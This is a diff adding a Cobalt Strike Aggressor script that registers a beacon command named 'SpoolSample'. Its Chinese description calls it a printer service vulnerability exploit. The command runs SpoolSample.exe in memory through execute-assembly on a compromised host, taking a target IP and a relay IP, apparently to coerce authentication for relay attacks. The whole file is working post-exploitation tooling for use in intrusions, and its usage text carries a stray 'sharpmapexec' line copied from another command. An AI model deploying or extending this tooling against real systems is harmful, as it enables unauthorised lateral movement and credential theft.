@@ -1,0 +1,20 @@
+beacon_command_register("SpoolSample", "打印机服务漏洞利用",
+	"Usage: SpoolSample targetip relayip \n" .
+	"Usage: sharpmapexec -h\n\n" .
+	"Uses execute-assembly to run the assembly and takes given arguments\n");
+
+alias SpoolSample{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$desc = "SpoolSample";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, script_resource("exe/SpoolSample.exe"), $argu);
+}
